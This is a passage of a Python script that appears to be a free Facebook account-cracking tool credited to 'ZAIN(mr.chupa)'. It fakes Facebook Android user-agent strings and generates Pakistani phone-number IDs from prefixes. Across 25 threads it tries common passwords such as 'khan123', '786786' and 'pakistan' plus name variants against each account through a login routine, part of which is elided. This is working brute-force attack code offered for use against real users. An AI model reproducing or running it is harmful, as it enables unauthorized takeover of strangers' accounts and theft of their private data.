...
def uaa():
    ua = (
        f'[FBAN/FB4A;FBAV/{random.randint(260, 270)}.0.0.{random.randint(42, 57)}.{random.randint(118, 127)};'
        f'FBBV/{random.randint(201518826, 214521896)};'
        f'FBDM/{{density={random.choice([2.0, 2.25, 2.625, 3.375, 4.0])},width={random.choice([720, 1080, 1440])},height={random.choice([1332, 2058, 2094, 2768])}}};'
        'FBLC/en_US;'
        f'FBRV/{random.randint(0, 214824289)};'
        f'FBCR/{random.choice(["Sprint", "cricket", "Verizon", "Google Fi", "AT&T", "Jio 4G"])};'
        f'FBMF/{random.choice(["samsung", "Google", "Alcatel", "LAVA"])};'
        f'FBBD/{random.choice(["samsung", "google", "TCL", "LAVA"])};'
        f'FBPN/com.facebook.katana;'
        f'FBDV/{random.choice(["SM-N950U", "SM-G965U", "SM-N960U", "Pixel 3a", "Alcatel_5008R", "SM-G975U", "SM-G960U", "Z81"])};'
        f'FBSV/{random.choice(["8.1.0", "9", "10"])};'
        'FBOP/19;'
        f'FBCA/{random.choice(["armeabi-v7a:armeabi", "arm64-v8a:"])};]'
    )
    return ua
#new ua
ugen=[]
...
def uaa():
    return "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/208.0.0.15.150;FBBV/28592563;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/129586458;FBCR/null;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-A700K;FBSV/12;FBCA/armeabi-v7a:armeabi;]"

logo='''
\033[93;1m   ___    _   _  _____  _  _   _  _   _
  (  _`\\ ( ) ( )(  _  )(_)( ) ( )( ) ( )
\033[97;1m  | (_(_)| |_| || (_) || || |/'/'| |_| |
  `\\__ \\ |  _  ||  _  || || , <  |  _  |
\033[92;1m  ( )_) || | | || | | || || |\\`\\ | | | |
  `\\____)(_) (_)(_) (_)(_)(_) (_)(_) (_)   \033[93;1m XD
\033[1;32m----------------------------------------------
 [•] Author     :  ZAIN(mr.chupa)
 [•] Facebook   :  ZAIN (chupa king)
 [•] Tool       :  free
 [•] Version    :  3.6
----------------------------------------------'''
...
def pak():
        user=[]
        clear()
        print('\033[1;35m Code example: 0322,0300,0312 ...etc')
        ...
        with tred(max_workers=25) as zain:
            ...
            for psx in user:
                ...
                passlist = [psx,ids,ps1,ps2,ps3,ps4,ps5,ps6,'khan123','khan12345','khan1122','786786','pakistan']
...
def api(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/214.0.0.13.147;FBBV/23647424;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/177259972;FBCR/Verizon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.%s;FBDV/GT-N7102i;FBSV/4.4.4;FBCA/armeabi-v7a:armeabi;]"
